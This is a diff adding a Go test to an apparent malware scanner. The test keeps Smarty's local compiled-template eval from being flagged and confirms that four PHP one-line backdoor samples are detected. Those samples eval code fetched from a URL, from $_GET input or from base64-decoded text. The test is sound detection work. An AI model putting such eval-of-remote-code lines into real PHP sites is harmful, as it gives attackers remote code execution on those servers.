@@ -2498,3 +2498,30 @@ func TestHintSweep(t *testing.T) {
 		t.Fatalf("scan row: %s %s", kind, status)
 	}
 }
+
+// cloud2 (2026-11-14): the new rules' sweep quarantined two Smarty files of
+// WHMCS as PHP.Backdoor.RemoteCodeEval: Smarty evaluates its own compiled
+// template with eval('?>' . file_get_contents(<local path>)) (on HHVM). A
+// local file is not fetched code; a URL, request data or decoded text is.
+func TestFleetSmartyEvalOwnTemplate(t *testing.T) {
+	s := newScanner(t)
+	smarty := "<?php\n/** Smarty Internal Plugin CacheResource File (inert fixture) */\nclass Smarty_Internal_CacheResource_File extends Smarty_CacheResource {\n" +
+		" public function process(Smarty_Internal_Template $_smarty_tpl, Smarty_Template_Cached $cached = null, $update = false) {\n" +
+		"  $_smarty_tpl->cached->valid = false;\n  if ($update && defined('HHVM_VERSION')) {\n   eval('?>' . file_get_contents($_smarty_tpl->cached->filepath));\n   return true;\n  } else {\n   return @include $_smarty_tpl->cached->filepath;\n  }\n }\n}\n"
+	compiled := "<?php\nclass Smarty_Template_Compiled extends Smarty_Template_Resource_Base {\n private function loadCompiledTemplate(Smarty_Internal_Template $_smarty_tpl) {\n  if (defined('HHVM_VERSION')) { eval('?>' . file_get_contents($this->filepath)); } else { include $this->filepath; }\n }\n}\n"
+	for name, body := range map[string]string{"smarty_internal_cacheresource_file.php": smarty, "smarty_template_compiled.php": compiled} {
+		if d := s.checkContent("/home/x/my.example.com/vendor/smarty/smarty/libs/sysplugins/"+name, ".php", []byte(body)); d != nil {
+			t.Errorf("%s: %+v", name, d)
+		}
+	}
+	for name, body := range map[string]string{
+		"url":          "<?php eval('?>' . file_get_contents('https://example.test/inert.txt'));\n",
+		"request":      "<?php eval('?>' . file_get_contents($_GET['u']));\n",
+		"url variable": "<?php $u = 'https://example.test/inert.txt'; eval('?>' . file_get_contents($u));\n",
+		"decoded":      "<?php eval('?>' . file_get_contents(base64_decode('aHR0cHM6Ly9leGFtcGxlLnRlc3Q=')));\n",
+	} {
+		if d := s.checkContent("/home/x/public_html/x.php", ".php", []byte(body)); d == nil || d.Category != CatVirus {
+			t.Errorf("%s: %+v", name, d)
+		}
+	}
+}
